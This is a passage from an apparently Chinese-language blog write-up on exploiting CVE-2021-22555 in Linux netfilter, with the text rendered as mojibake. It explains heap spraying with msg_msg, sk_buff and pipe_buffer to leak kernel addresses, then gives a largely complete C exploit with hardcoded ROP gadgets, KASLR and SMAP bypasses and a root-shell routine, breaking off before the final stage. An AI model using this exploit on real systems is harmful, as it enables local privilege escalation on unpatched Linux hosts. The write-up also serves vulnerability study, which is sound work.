‡å¿—æ¥åˆ¤æ–­åˆ°åº•æ˜¯å“ªä¸ªè¾…åŠ©æ¶ˆæ¯è¢«ä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æ‰€åŒ…å«ï¼Œè¿™æ ·å°±èƒ½è¿›è¡Œåç»­çš„åˆ©ç”¨ã€‚\n\n## 2.åˆ©ç”¨UAF\n\n### (1)æ³„éœ²å †åœ°å€\n\né¦–å…ˆä½¿ç”¨`sk_buff`çš„`data`æ•°æ®å—æ¥å æ®è¯¥`UAF`å †å—ã€‚å‰é¢æåˆ°`sk_buff`çš„ç»“æ„å¤´ä½¿ç”¨ç‹¬æœ‰çš„ç¼“å†²æ± `kache`æ¥ç”³è¯·ï¼Œä½†æ˜¯å…¶`data`æ•°æ®å—è¿˜æ˜¯ä½¿ç”¨`kmalloc`å¸¸è§„è·¯çº¿æ¥ç”³è¯·é‡Šæ”¾(ä½¿ç”¨æ­£å¸¸çš„å‘åŒ…æ”¶åŒ…å³å¯å®Œæˆç”³è¯·é‡Šæ”¾)ï¼Œå¹¶ä¸”`size`å’Œ`data`å†…å®¹å®Œå…¨å¯æ§ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å®Œå…¨æ§åˆ¶è¯¥`UAF`å †å—ã€‚\n\nä¹‹åä¼ªé€ ä¸€ä¸ª`fake_msg_msg`ç»“æ„ä½“ï¼Œç»“æ„å¦‚ä¸‹\n\n![image-20220513112451162](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513112451162.png)\n\n```c\n//v5.11 /include/linux/msg.h\nstruct msg_msg {\n\tstruct list_head m_list;//ä¸msg_queueæˆ–è€…å…¶ä»–çš„msg_msgç»„æˆåŒå‘å¾ªç¯é“¾è¡¨\n\tlong m_type;\n\tsize_t m_ts;\t\t/* message text size */\n\tstruct msg_msgseg *next;//å•å‘é“¾è¡¨ï¼ŒæŒ‡å‘è¯¥æ¡ä¿¡æ¯åé¢çš„msg_msgseg\n\tvoid *security;\n\t/* the actual message follows immediately */\n};\n```\n\næ”¹å¤§å…¶`m_ts`åŸŸï¼Œå°±å¯ä»¥è¯»å–å‡ºæ¶ˆæ¯é˜Ÿåˆ—2çš„è¾…åŠ©æ¶ˆæ¯å¤´éƒ¨æŒ‡é’ˆ`struct list_head m_list.next`çš„å€¼ï¼Œä»è€Œæ³„éœ²æ¶ˆæ¯é˜Ÿåˆ—2çš„`msg_msg_queue`çš„`struct list_head m_list`åŸŸçš„åœ°å€ï¼Œä¸ºä¸€ä¸ªå †åœ°å€ã€‚\n\nä¹‹åæˆ‘ä»¬ä¿®æ”¹`fake_msg_msg`çš„`struct msg_msgseg *next`æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸Šè¿°è·å¾—çš„æ¶ˆæ¯é˜Ÿåˆ—2çš„`struct list_head m_list`åŸŸçš„åœ°å€ï¼Œå°±èƒ½è¯»å‡ºè¯¥`struct list_head m_list`åŸŸçš„`prev`æŒ‡é’ˆï¼Œå³ä¸ºæ¶ˆæ¯é˜Ÿåˆ—2çš„è¾…åŠ©æ¶ˆæ¯çš„åœ°å€ï¼Œå‡å»`0x400`å³ä¸º`UAF`å †å—çš„åœ°å€\n\n### (2)æ³„éœ²å†…æ ¸åŸºåœ°å€\n\næ¥ä¸‹æ¥åˆ©ç”¨åˆ°`pipe`ç®¡é“ï¼Œä¸»è¦æ˜¯å…¶ä¸­`struct pipe_inode_info`çš„`struct pipe_buffer *bufs;`æ•°ç»„ï¼Œæ€»å¤§å°ä¸º`0x280`ï¼Œä½¿ç”¨`kmalloc-1024`ï¼Œæ»¡è¶³å½“å‰çš„`UAF`ï¼ˆåŒæ ·ä½¿ç”¨æ­£å¸¸çš„`read/write`å³å¯å®Œæˆç”³è¯·é‡Šæ”¾ï¼‰ã€‚å…¶ç»“æ„ä¸º\n\n```c\n//v5.11.14 /include/linux/pipe_fs_i.h\nstruct pipe_buffer {\n\tstruct page *page;\n\tunsigned int offset, len;\n\tconst struct pipe_buf_operations *ops;\n\tunsigned int flags;\n\tunsigned long private;\n};\n```\n\nåˆ©ç”¨å¦‚ä¸‹æ“ä½œè¯»å–`const struct pipe_buf_operations *ops;`æŒ‡é’ˆï¼Œå³å¯æ³„éœ²å†…æ ¸åŸºåœ°å€\n\n- åˆ©ç”¨ `sk_buff` ä¿®å¤`UAF`å¤„çš„è¾…åŠ©æ¶ˆæ¯ï¼Œä¹‹åä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ­¤æ—¶è¯¥`UAF`å¯¹è±¡é‡å› `slub`çš„`kmalloc-1024`çš„`freelist`ä¸­ï¼Œä½† `sk_buff` ä»æŒ‡å‘è¯¥`UAF`å¯¹è±¡\n- å–·å°„ `pipe_buffer`ï¼Œå°±ä¼šå°†è¯¥`UAF`å¯¹è±¡ç”³è¯·å›æ¥ï¼Œå°†`pipe_buffer`å†™å…¥åˆ°è¯¥`UAF`å¯¹è±¡ä¸Šï¼Œä¹‹åå†æ¥æ”¶ `sk_buff` æ•°æ®åŒ…ï¼Œå³å¯è·å–`pipe_buffer`ä¸Šçš„æ•°æ®ï¼Œå¾—åˆ°`const struct pipe_buf_operations *ops;`æŒ‡é’ˆï¼Œå³å¯æ³„éœ²å†…æ ¸åŸºåœ°å€\n\n![image-20220513115154194](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513115154194.png)\n\n### (3)åŠ«æŒç¨‹åºæ‰§è¡Œæµ\n\nä¹‹å‰ä¹Ÿæåˆ°è¿‡ï¼Œå½“æˆ‘ä»¬å…³é—­ç®¡é“`pipe`ä¸¤ç«¯æˆ–è€…ä»ç®¡é“`pipe`ä¸­è¯»å–å‡ºæ‰€æœ‰æ•°æ®ä¹‹åï¼Œä¼šè°ƒç”¨åˆ°`pipe_buf_release()`å‡½æ•°è¿›è¡Œæ¸…ç†ï¼Œå…¶ä¸­ä¼šè°ƒç”¨`struct pipe_buffer *bufs;`ä¸‹çš„`const struct pipe_buf_operations *ops;`å¯¹åº”å‡½æ•°è¡¨ä¸­çš„`release`å‡½æ•°æŒ‡é’ˆã€‚\n\n```c\nstatic inline void pipe_buf_release(struct pipe_inode_info *pipe,\n\t\t\t\t    struct pipe_buffer *buf)\n{\n\tconst struct pipe_buf_operations *ops = buf->ops;\n\n\tbuf->ops = NULL;\n\tops->release(pipe, buf);\n}\n```\n\nç°åœ¨æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡`sk_buff`æ¥åŠ«æŒåŠ«æŒ`ops`æŒ‡é’ˆå‡½æ•°è¡¨ï¼Œä¿®æ”¹å…¶ä¸­çš„`release`å‡½æ•°æŒ‡é’ˆï¼Œå®ŒæˆåŠ«æŒç¨‹åºæµã€‚å¹¶ä¸”æ­¤æ—¶çš„`rsi`å³ä¸º`buf`ä¸ºæˆ‘ä»¬çš„`UAF`å¯¹è±¡ï¼Œè€Œ`sk_buff`åˆå¯ä»¥ä½¿å¾—`UAF`å¯¹è±¡é‡Œçš„æ•°æ®å®Œå…¨å¯æ§ã€‚å¦‚æœæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å°†`rsp`åŠ«æŒä¸º`rsi`çš„`gadget`ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®Œå…¨æ“æ§ç¨‹åºæµç¨‹äº†ã€‚\n\n## 3.EXPè§£æ\n\nè¿™ä¸ªå…¶å®ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¥½è®²çš„ï¼Œçœ‹æ‡‚æ¼æ´åˆ©ç”¨è¿‡ç¨‹å…¶å®ä¹Ÿå¾ˆå®¹æ˜“å†™å‡ºæ¥çš„ï¼Œä¸»è¦æä¸€ä¸‹æŸäº›æ¯”è¾ƒåçš„çŸ¥è¯†ç‚¹ï¼Œä¹Ÿé˜²æ­¢å¿˜è®°ã€‚\n\n### (1)ç»‘å®šCPUåˆ†é…\n\né€šå¸¸æ˜¯ç”¨æ¥è¿›è¡Œå †å—åˆ†é…æ—¶æŸ¥çœ‹å †å—å†…å­˜çš„ï¼Œé˜²æ­¢å †å—ç”³è¯·çš„æ—¶å€™ä¸œä¸€ä¸ªè¥¿ä¸€ä¸ªçš„ï¼Œæ–¹ä¾¿è°ƒè¯•ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸ºäº†æé«˜å †å–·å°„çš„ç¨³å®šæ€§\n\n```c\n//bind the cpu0\ncpu_set_t set;\nCPU_ZERO(&set);\nCPU_SET(0, &set);\nif (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {\n    perror(\"[-] sched_setaffinity\");\n    return -1;\n}\n```\n\n### (2)å‘½åç©ºé—´\n\n```c\nint setup_sandbox(void) {\n  if (unshare(CLONE_NEWUSER) < 0) {\n    perror(\"[-] unshare(CLONE_NEWUSER)\");\n    return -1;\n  }\n  if (unshare(CLONE_NEWNET) < 0) {\n    perror(\"[-] unshare(CLONE_NEWNET)\");\n    return -1;\n  }\n}\n```\n\n`EXP`åŸä½œè€…ç§°ï¼šå½“`IPT_SO_SET_REPLACE`æˆ–`IP6T_SO_SET_REPLACE`åœ¨å…¼å®¹æ¨¡å¼ä¸‹è¢«è°ƒç”¨æ—¶ï¼ˆéœ€è¦`CAP_NET_ADMIN`æƒé™ï¼‰ã€‚\n\nè¿™ä¸ªåœ¨æºä»£ç `do_ipt_set_ctl()`å‡½æ•°ä¸­æœ‰æ‰€ä½“ç°\n\n```c\n//v5.11.14 /net/ipv4/netfilter/ip_tables.c\nstatic int\ndo_ipt_set_ctl(struct sock *sk, int cmd, sockptr_t arg, unsigned int len)\n{\n\tint ret;\n\t//æåˆ°å½“å…¼å®¹æ¨¡å¼ä¸‹éœ€è¦CAP_NET_ADMINæƒé™\n\tif (!ns_capable(sock_net(sk)->user_ns, CAP_NET_ADMIN))\n\t\treturn -EPERM;\n    //....\n\treturn ret;\n}\n```\n\nè€Œç”¨æˆ·ç©ºé—´éš”ç¦»å‡ºç‹¬ç«‹çš„å‘½åç©ºé—´åå°±èƒ½æ‹¥æœ‰`CAP_NET_ADMIN`æƒé™ï¼Œæ‰€ä»¥éœ€è¦ï¼Œå…¶å®ä¹Ÿä¸æ˜¯å¤ªæ‡‚è¿™ä¸ªå¹²å•¥çš„ã€‚\n\nå…¶ä»–çš„å¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆäº†ï¼Œå°±æ˜¯æœ€åçš„`ROP`é“¾æ¡æ–¹é¢çš„ä¸œè¥¿ï¼Œç”±äºæœ€åè§¦å‘åŠ«æŒç¨‹åºæµçš„æ—¶å€™ï¼Œ`rsi`ä¸º`UAF`å¯¹è±¡åœ°å€ï¼Œæ‰€ä»¥åˆ©ç”¨`gadget`å…ˆè¿›è¡Œæ ˆåŠ«æŒ`rsp`ï¼Œç„¶åä½¿ç”¨åˆ©ç”¨`commit_creds(&init_cred)`è·å–ROOTæƒé™ï¼Œä¹‹åä½¿ç”¨`SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE`ç»•è¿‡`KPTI`å’Œ`SMEP`å³å¯ã€‚\n\nå‚è€ƒï¼š[ã€CVE.0x07ã€‘CVE-2021-22555 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ - arttnba3's blog](https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT)\n\n[Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/240006)\n\n### (3)æœ€ç»ˆEXP\n\nä¸»è¦æ˜¯[bsauceå¸ˆå‚…çš„EXP](https://github.com/bsauce/kernel-exploit-factory)å’Œ[arttnba3å¸ˆå‚…çš„EXP](https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT)ï¼Œç„¶åæ”¹å·´æ”¹å·´ï¼ŒåŠ äº†ç‚¹ä¸œè¥¿ï¼Œæ›¿æ¢äº†ä¸€ä¸‹ROPé“¾æ¡ä»€ä¹ˆçš„ã€‚\n\n```c\n//compile exp: $ gcc -m32 -static -masm=intel -o exploit exploit.c\n#define _GNU_SOURCE\n#include <err.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <inttypes.h>\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <net/if.h>\n#include <netinet/in.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n#include <sys/socket.h>\n#include <sys/syscall.h>\n#include <linux/netfilter_ipv4/ip_tables.h>\n\n// clang-format on\n#define PAGE_SIZE 0x1000\n#define PRIMARY_SIZE 0x1000\n#define SECONDARY_SIZE 0x400\n\n#define NUM_SOCKETS 4\n#define NUM_SKBUFFS 128\n#define NUM_PIPEFDS 256\n#define NUM_MSQIDS 4096\n\n#define HOLE_STEP 1024\n\n#define MTYPE_PRIMARY 0x41\n#define MTYPE_SECONDARY 0x42\n#define MTYPE_FAKE 0x1337\n\n#define MSG_TAG 0xAAAAAAAA\n\n//Gadget \n#define PUSH_RSI_JMP_RSI_0x2E 0xffffffff81b4e244\n#define ADD_RSP_0x98_RET 0xffffffff81a7895e\n#define POP_RSP_RET 0xffffffff81900644\n#define POP_RDI_RET 0xffffffff81001629\n#define INIT_CRED 0xffffffff8244c8a0\n#define COMMIT_CREDS 0xffffffff8108e690\n#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00df0\n\n#define ANON_PIPE_BUF_OPS 0xffffffff82019340\n\n//pt_regs\nsize_t user_cs, user_ss, user_sp, user_eflags;\n\n\n// clang-format on\n#define SKB_SHARED_INFO_SIZE 0x140\n#define MSG_MSG_SIZE (sizeof(struct msg_msg))\n#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))\n\n//some struct\nstruct msg_msg {\n  uint64_t m_list_next;\n  uint64_t m_list_prev;\n  uint64_t m_type;\n  uint64_t m_ts;\n  uint64_t next;\n  uint64_t security;\n};\n\nstruct msg_msgseg {\n  uint64_t next;\n};\n\nstruct pipe_buffer {\n  uint64_t page;\n  uint32_t offset;\n  uint32_t len;\n  uint64_t ops;\n  uint32_t flags;\n  uint32_t pad;\n  uint64_t private;\n};\n\nstruct pipe_buf_operations {\n  uint64_t confirm;\n  uint64_t release;\n  uint64_t steal;\n  uint64_t get;\n};\n\nstruct {\n  long mtype;\n  char mtext[PRIMARY_SIZE - MSG_MSG_SIZE];\n} msg_primary;\n\nstruct {\n  long mtype;\n  char mtext[SECONDARY_SIZE - MSG_MSG_SIZE];\n} msg_secondary;\n\nstruct {\n  long mtype;\n  char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];\n} msg_fake;\n\nvoid build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,\n                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {\n  msg->m_list_next = m_list_next;\n  msg->m_list_prev = m_list_prev;\n  msg->m_type = MTYPE_FAKE;\n  msg->m_ts = m_ts;\n  msg->next = next;\n  msg->security = 0;\n}\n\nvoid getRootShell(void)\n{\n    if (getuid())\n    {\n      printf(\"failed to gain the root!\\n\");\n      exit(0);\n    }\n    printf(\"\\033[32m\\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\\033[0m\\n\");\n    system(\"/bin/sh\");\n}\n\nvoid saveStatus()\n{\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, esp;\"\n            \"pushf;\"\n            \"pop user_eflags;\"\n            );\n    printf(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\\n\");\n}\n\n\nint write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {\n  *(long *)msgp = msgtyp;\n  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) {\n    perror(\"[-] msgsnd\");\n    return -1;\n  }\n  return 0;\n}\n\nint peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {\n  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) <\n      0) {\n    perror(\"[-] msgrcv\");\n    return -1;\n  }\n  return 0;\n}\n\nint read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {\n  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {\n    perror(\"[-] msgrcv\");\n    return -1;\n  }\n  return 0;\n}\n\nint spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {\n  for (int i = 0; i < NUM_SOCKETS; i++) {\n    for (int j = 0; j < NUM_SKBUFFS; j++) {\n      if (write(ss[i][0], buf, size) < 0) {\n        perror(\"[-] write\");\n        return -1;\n      }\n    }\n  }\n  return 0;\n}\n\nint free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) {\n  for (int i = 0; i < NUM_SOCKETS; i++) {\n    for (int j = 0; j < NUM_SKBUFFS; j++) {\n      if (read(ss[i][1], buf, size) < 0) {\n        perror(\"[-] read\");\n        return -1;\n      }\n    }\n  }\n  return 0;\n}\n\nint trigger_oob_write(int s) {\n  struct __attribute__((__packed__)) {\n    struct ipt_replace replace;                     // 0x60\n    struct ipt_entry entry;                         // 0x70\n    struct xt_entry_match match;                    // 0x20\n    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];   //  kvmalloc_size = sizeof(xt_table_info) + ipt_replace->size =  0x40 + (0xFB8 - 0x2) = 0xFF8 - 0x2\n    struct xt_entry_target target;                  // 0x20\n  } data = {0};\n\n  data.replace.num_counters = 1;\n  data.replace.num_entries = 1;\n  data.replace.size = (sizeof(data.entry) + sizeof(data.match) +\n                       sizeof(data.pad) + sizeof(data.target));             // 0x70 + (0x108+0x1000-0x200-0x2) + 0x20 + 0x20 = 0xFB8 - 0x2\n\n  data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +\n                            sizeof(data.pad) + sizeof(data.target));        // Size of ipt_entry + matches + target\n  data.entry.target_offset =\n      (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));         // Size of ipt_entry + matches\n\n  data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));   // 0x20 + (0x108+0x1000-0x200-0x2) = 0xF28 - 0x2\n  strcpy(data.match.u.user.name, \"icmp\");\n  data.match.u.user.revision = 0;\n\n  data.target.u.user.target_size = sizeof(data.target);                     // 0x20\n  strcpy(data.target.u.user.name, \"NFQUEUE\");\n  data.target.u.user.revision = 1;\n  getchar();\n\n  // Partially overwrite the adjacent buffer with 2 bytes of zero.\n  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {\n    if (errno == ENOPROTOOPT) {\n      printf(\"[-] Error ip_tables module is not loaded.\\n\");\n      return -1;\n    }\n  }\n\n  return 0;\n}\n\n\nint setup_sandbox(void) {\n  if (unshare(CLONE_NEWUSER) < 0) {\n    perror(\"[-] unshare(CLONE_NEWUSER)\");\n    return -1;\n  }\n  if (unshare(CLONE_NEWNET) < 0) {\n    perror(\"[-] unshare(CLONE_NEWNET)\");\n    return -1;\n  }\n\n  //bind the cpu0\n  cpu_set_t set;\n  CPU_ZERO(&set);\n  CPU_SET(0, &set);\n  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {\n    perror(\"[-] sched_setaffinity\");\n    return -1;\n  }\n\n  return 0;\n}\n\nint main(int argc, char *argv[]) {\n  int s;\n  int fd;\n  int ss[NUM_SOCKETS][2];\n  int pipefd[NUM_PIPEFDS][2];\n  int msqid[NUM_MSQIDS];\n  uint64_t    *rop_chain;\n\n  char primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];\n  char secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];\n\n  struct msg_msg *msg;\n  struct pipe_buf_operations *fake_pipe_buffer_ops;\n  struct pipe_buffer *fake_pipe_buffer;\n\n  uint64_t pipe_buffer_ops = 0;\n  uint64_t kheap_addr = 0, kbase_addr = 0, kernel_offset = 0;\n\n  int fake_idx = -1, real_idx = -1;\n  saveStatus();\n  printf(\"\\033[32m\\033[1m[+] STAGE 0: Initialization\\033[0m\\n\");\n\n  printf(\"[*] Setting up namespace sandbox...\\n\");\n  if (setup_sandbox() < 0)\n    goto err_no_rmid;\n\n\n  printf(\"[*] Initializing sockets and message queues...\\n\");\n\n  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {\n    perror(\"[-] socket\");\n    goto err_no_rmid;\n  }\n\n  for (int i = 0; i < NUM_SOCKETS; i++) {\n    if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {\n      perror(\"[-] socketpair\");\n      goto err_no_rmid;\n    }\n  }\n// 1. two bytes null write -> UAF\n// 1-1. gain 4096 msg queue\n  for (int i = 0; i < NUM_MSQIDS; i++) {\n    if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {\n      perror(\"[-] msgget\");\n      goto err_no_rmid;\n    }\n  }\n\n  printf(\"\\n\");\n  printf(\"\\033[32m\\033[1m[+] STAGE 1: Memory corruption\\033[0m\\n\");\n//1-2. create 4096 primary msg â€”â€” size=0x1000\n  printf(\"[*] Spraying primary messages...\\n\");\n  for (int i = 0; i < NUM_MSQIDS; i++) {\n    memset(&msg_primary, '\\xdd', 0x100);\n    *(int *)&msg_primary.mtext[0] = MSG_TAG;\n    *(int *)&msg_primary.mtext[4] = i;\n    if (write_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) < 0)\n      goto err_rmid;\n  }\n// 1-3. create 4096 secondary msg â€”â€” size=0x400\n  printf(\"[*] Spraying secondary messages...\\n\");\n  for (int i = 0; i < NUM_MSQIDS; i++) {\n    memset(&msg_secondary, 0, sizeof(msg_secondary));\n    *(int *)&msg_secondary.mtext[0] = MSG_TAG;\n    *(int *)&msg_secondary.mtext[4] = i;\n    if (write_msg(msqid[i], &msg_secondary, sizeof(msg_secondary),\n                  MTYPE_SECONDARY) < 0)\n      goto err_rmid;\n  }\n// 1-4. release #1024/#2048/#3072 msg\n  printf(\"[*] Creating holes in primary messages...\\n\");\n  for (int i = HOLE_STEP; i < NUM_MSQIDS; i += HOLE_STEP) {\n    if (read_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) <\n        0)\n      goto err_rmid;\n  }\n// 1-5. make xt_table_info struct take up the hole, and triger 2 bytes null write\n  printf(\"[*] Triggering out-of-bounds write...\\n\");\n  if (trigger_oob_write(s) < 0)\n    goto err_rmid;\n\n// 1-6. find which msg is corrupted\n  printf(\"[*] Searching for corrupted primary message...\\n\");\n  for (int i = 0; i < NUM_MSQIDS; i++) {\n    if (i != 0 && (i % HOLE_STEP) == 0)\n      continue;\n    if (peek_msg(msqid[i], &msg_secondary, sizeof(msg_secondary), 1) < 0)\n      goto err_no_rmid;\n    if (*(int *)&msg_secondary.mtext[0] != MSG_TAG) {\n      printf(\"[-] Error could not corrupt any primary message.\\n\");\n      goto err_no_rmid;\n    }\n    if (*(int *)&msg_secondary.mtext[4] != i) {\n      fake_idx = i;\n      real_idx = *(int *)&msg_secondary.mtext[4];\n      break;\n    }\n  }\n\n  if (fake_idx == -1 && real_idx == -1) {\n    printf(\"[-] Error could not corrupt any primary message.\\n\");\n    goto err_no_rmid;\n  }\n\n  // fake_idx's primary message has a corrupted next pointer; wrongly pointing to real_idx's secondary message.\n  printf(\"[+] fake_idx: 0x%x\\n\", fake_idx);\n  printf(\"[+] real_idx: 0x%x\\n\", real_idx);\n\n  printf(\"\\n\");\n  printf(\"\\033[32m\\033[1m[+] STAGE 2: SMAP bypass\\033[0m\\n\");\n// 2. leak secondary msg address (kmalloc-0x400) -> to forge `msg_msg->m_list->next & prev`\n// 2-1. free overlapped msg\n  printf(\"[*] Freeing real secondary message...\\n\");\n  if (read_msg(msqid[real_idx], &msg_secondary, sizeof(msg_secondary),\n               MTYPE_SECONDARY) < 0)\n    goto err_rmid;\n\n  // Reclaim the previously freed secondary message with a fake msg_msg of maximum possible size.\n// 2-2. spray and forge msg_msg (forge larger msg_msg->m_ts)\n  printf(\"[*] Spraying fake secondary messages...\\n\");\n  memset(secondary_buf, 0, sizeof(secondary_buf));\n  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,\n                PAGE_SIZE - MSG_MSG_SIZE, 0);\n  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)\n    goto err_rmid;\n// 2-2. leak heap pointer `msg_msg->m_list->prev` (kmalloc-0x1000)\n  // Use the fake secondary message to read out-of-bounds.\n  printf(\"[*] Leaking adjacent secondary message...\\n\");\n  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)\n    goto err_rmid;\n\n  // Check if the leak is valid.\n  if (*(int *)&msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) {\n    printf(\"[-] Error could not leak adjacent secondary message.\\n\");\n    goto err_rmid;\n  }\n\n  // The secondary message contains a pointer to the primary message.\n  msg = (struct msg_msg *)&msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];\n  kheap_addr = msg->m_list_next;\n  if (kheap_addr & (PRIMARY_SIZE - 1))\n    kheap_addr = msg->m_list_prev;\n  printf(\"[+] kheap_addr: 0x%\" PRIx64 \"\\n\", kheap_addr);\n\n  if ((kheap_addr & 0xFFFF000000000000) != 0xFFFF000000000000) {\n    printf(\"[-] Error kernel heap address is incorrect.\\n\");\n    goto err_rmid;\n  }\n// 2-3. leak heap pointer `msg_msg->m_list->prev` (kmalloc-0x400)  (forge msg_msg->next)\n  printf(\"[*] Freeing fake secondary messages...\\n\");\n  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));\n\n  // Put kheap_addr at next to leak its content. Assumes zero bytes before\n  // kheap_addr.\n  printf(\"[*] Spraying fake secondary messages...\\n\");\n  memset(secondary_buf, 0, sizeof(secondary_buf));\n  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,\n                sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);      // fist 8 bytes must be NULL\n  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)\n    goto err_rmid;\n\n  // Use the fake secondary message to read from kheap_addr.\n  printf(\"[*] Leaking primary message...\\n\");\n  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)\n    goto err_rmid;\n\n  // Check if the leak is valid.\n  if (*(int *)&msg_fake.mtext[PAGE_SIZE] != MSG_TAG) {\n    printf(\"[-] Error could not leak primary message.\\n\");\n    goto err_rmid;\n  }\n\n  // The primary message contains a pointer to the secondary message.\n  msg = (struct msg_msg *)&msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];\n  kheap_addr = msg->m_list_next;\n  if (kheap_addr & (SECONDARY_SIZE - 1))\n    kheap_addr = msg->m_list_prev;\n\n  // Calculate the address of the fake secondary message.\n  kheap_addr -= SECONDARY_SIZE;\n  printf(\"[+] kheap_addr: 0x%\" PRIx64 \"\\n\", kheap_addr);\n\n  if ((kheap_addr & 0xFFFF00000000FFFF) != 0xFFFF000000000000) {\n    printf(\"[-] Error kernel heap address is incorrect.\\n\");\n    goto err_rmid;\n  }\n// 3. leak kernel base\n  printf(\"\\n\");\n  printf(\"\\033[32m\\033[1m[+] STAGE 3: KASLR bypass\\033[0m\\n\");\n\n  printf(\"[*] Freeing fake secondary messages...\\n\");\n  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));\n\n// 3-1. forge `msg_msg->m_list->next & prev` so that list_del() does not crash.\n  printf(\"[*] Spraying fake secondary messages...\\n\");\n  memset(secondary_buf, 0, sizeof(secondary_buf));\n  build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);\n  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)\n    goto err_rmid;\n// 3-2. free secondary msg\n  printf(\"[*] Freeing sk_buff data buffer...\\n\");\n  if (read_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), MTYPE_FAKE) < 0)\n    goto err_rmid;\n// 3-3. spray pipe_buffer object\n  printf(\"[*] Spraying pipe_buffer objects...\\n\");\n  for (int i = 0; i < NUM_PIPEFDS; i++) {\n    if (pipe(pipefd[i]) < 0) {\n      perror(\"[-] pipe\");\n      goto err_rmid;\n    }\n    // Write something to populate pipe_buffer.\n    if (write(pipefd[i][1], \"pwn\", 3) < 0) {\n      perror(\"[-] write\");\n      goto err_rmid;\n    }\n  }\n// 3-4. leak pipe_buffer->ops â€”â€” kernel base\n  printf(\"[*] Leaking and freeing pipe_buffer object...\\n\");\n  for (int i = 0; i < NUM_SOCKETS; i++) {\n    for (int j = 0; j < NUM_SKBUFFS; j++) {\n      if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {\n        perror(\"[-] read\");\n        goto err_rmid;\n      }\n      if (*(uint64_t *)&secondary_buf[0x10] != MTYPE_FAKE)\n        pipe_buffer_ops = *(uint64_t *)&secondary_buf[0x10];\n    }\n  }\n  kernel_offset = pipe_buffer_ops - ANON_PIPE_BUF_OPS;\n  kbase_addr = 0xffffffff81000000 + kernel_offset;\n  printf(\"[+] anon_pipe_buf_ops: 0x%\" PRIx64 \"\\n\", pipe_buffer_ops);\n  printf(\"[+] kbase_addr: 0x%\" PRIx64 \"\\n\", kbase_addr);\n\n  if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000) {\n    printf(\"[-] Error kernel base address is incorrect.\\n\");\n    goto err_rmid;\n  }\n// 4. hijack control-flow\n  printf(\"\\n\");\n  